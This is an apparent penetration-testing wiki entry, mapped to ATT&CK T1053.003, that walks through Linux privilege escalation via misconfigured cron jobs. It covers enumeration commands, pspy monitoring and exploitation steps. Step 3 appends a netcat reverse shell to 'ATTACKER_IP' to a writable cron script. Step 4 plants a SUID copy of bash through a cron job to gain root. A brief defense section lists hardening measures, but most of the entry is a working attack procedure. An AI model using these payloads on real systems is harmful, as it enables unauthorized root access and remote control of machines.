---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege-Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Scheduled-Task-Job|T1053.003 - Cron]]'
sub_techniques: []
tags:
  - '[[tags/cron-jobs]]'
  - '[[tags/linux-privilege-escalation]]'
  - '[[tags/scheduled-tasks]]'
commands:
  - '[[commands/enumerate-cron-jobs-and-directories]]'
  - '[[commands/view-cron-access-control-files]]'
  - '[[commands/run-pspy-to-detect-spawns]]'
platforms:
  - Linux
tools:
  - '[[tools/pspy]]'
verified: true
validated: true
---

# Linux Privilege Escalation via Scheduled Tasks

## Summary

This procedure details the process of enumerating and exploiting scheduled tasks on Linux systems, focusing on Cron jobs, to achieve privilege escalation. Attackers identify misconfigured or writable cron scripts that execute with elevated privileges, allowing injection of malicious code for root access. Tools like pspy help detect dynamic job executions not visible in static configurations.

## Description

Linux scheduled tasks, managed primarily by the cron daemon, automate script and command execution at fixed intervals, often as root. Vulnerabilities arise when cron jobs reference writable files, use relative paths leading to PATH hijacking, or run user-modifiable scripts. This procedure involves static enumeration of cron files and permissions, followed by dynamic monitoring with pspy to capture executions. Once a vulnerable job is found (e.g., a root cron running /usr/local/script.sh where script.sh is writable), the attacker edits it to include a payload like a reverse shell. This technique is common in privilege escalation during penetration tests or real attacks, providing persistence and higher access on Unix-like systems.

## Requirements

1. Non-root shell access to the target Linux system (e.g., via initial foothold)
2. Ability to read/execute basic bash commands and transfer tools like pspy
3. pspy binary downloaded and executable on the target (no installation required)

## Defense

- Enforce strict file permissions on cron scripts and directories (e.g., chmod 700 /etc/cron.d/*, owned by root)
- Use absolute paths in cron jobs to prevent PATH hijacking and regularly audit /etc/cron* and user crontabs
- Enable process auditing with auditd to log cron spawns and monitor for unauthorized modifications to scheduled tasks
- Restrict crontab access via /etc/cron.allow and implement AppArmor/SELinux profiles for cron executions

## Objectives

1. Discover all cron jobs, their permissions, and access controls to pinpoint exploitable misconfigurations
2. Dynamically observe cron-spawned processes to identify hidden or runtime-vulnerable tasks
3. Inject code into a vulnerable cron job to execute arbitrary commands as root, achieving privilege escalation

## Instructions

### Step 1: Enumerate Cron Jobs and Directories

**Context**: Begin by scanning for cron-related files, directories, and user jobs to map the scheduled task landscape. This step identifies potential entry points like writable directories or readable crontabs that reveal job details.

**Command** ([[commands/enumerate-cron-jobs-and-directories]]):
```bash
ls -la /etc/ | grep cron; ls -la /etc/cron*; cat /etc/crontab 2>/dev/null; ls -alh /var/spool/cron/ 2>/dev/null; crontab -l 2>/dev/null
```

> This chained command greps for cron in /etc, lists /etc/cron* contents, views the system crontab, checks the spool directory for user tabs, and lists the current user's crontab. Why: Reveals schedules, permissions, and ownership to spot world-writable files (e.g., 777 perms on a script). Expected output: Directory listings with perms like "drwxrwxrwt 2 root root 4096 ... /var/spool/cron", crontab entries like "0 2 * * * root /path/to/backup.sh", or "no crontab for user" if none.

### Step 2: Check Cron Access Control Files

**Context**: Review allow/deny files to assess if the current user can create or edit crontabs. If deny lists are empty or don't include your user, you can potentially add malicious jobs via crontab -e.

**Command** ([[commands/view-cron-access-control-files]]):
```bash
cat /etc/cron.allow 2>/dev/null || echo "No cron.allow file (all users allowed)"; cat /etc/cron.deny 2>/dev/null || echo "No cron.deny file (all users allowed unless in allow)"; cat /etc/at.allow 2>/dev/null || echo "No at.allow file"; cat /etc/at.deny 2>/dev/null || echo "No at.deny file"
```

> This command attempts to display access control files, falling back to messages if absent. Why: Determines cron/at job creation rights; empty deny often means editable crontabs. Expected output: User lists (e.g., "user1
user2") or fallback messages. Success if your username is absent from deny files, enabling crontab -e.

### Step 3: Monitor System for Cron Executions with Pspy

**Context**: Static enumeration may miss dynamic jobs; use pspy to watch for process spawns from cron (PID ~700-800 typically). This captures executions in real-time, showing commands run as root for exploitation targeting.

**Command** ([[commands/run-pspy-to-detect-spawns]]):
```bash
./pspy64 -pf -i 1000
```

> Runs pspy to log process (-p) and file (-f) events every 1000ms. Why: Detects cron-triggered processes (parent PID is crond) and their paths, revealing exploitable jobs like a root bash invoking a writable script. Expected output: Continuous log like "[xx:xx:xx] PID: 1234, PPID: 567 (crond), CMD: /bin/bash /etc/cron.hourly/logrotate". Run for 5-10 minutes or until a target job triggers; Ctrl+C to stop. If a vulnerable path is seen (e.g., /tmp/cleanup.sh writable), edit it pre-execution: echo 'nc -e /bin/sh ATTACKER_IP 4444' >> /tmp/cleanup.sh, then wait for cron run to get root shell.

### Step 4: Exploit Identified Vulnerability

**Context**: With enumeration data, target a specific weakness (e.g., writable cron script). This step assumes a found vuln like a root cron sourcing /home/user/.profile (PATH hijacking) or editable job file.

**Instructions**: If a cron job runs a writable script (e.g., /etc/cron.daily/vuln.sh owned 666), replace contents: cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; echo '/tmp/rootbash -p' > /etc/cron.daily/vuln.sh. Alternatively, for PATH hijack, add malicious binary to PATH before cron runs. Verify with ls -l on the file post-modification.

> No specific command here; use basic bash like echo or cp. Expected: Modified file confirmed writable/executable. Success when cron executes: check with ps aux | grep your_payload or incoming connection on listener.
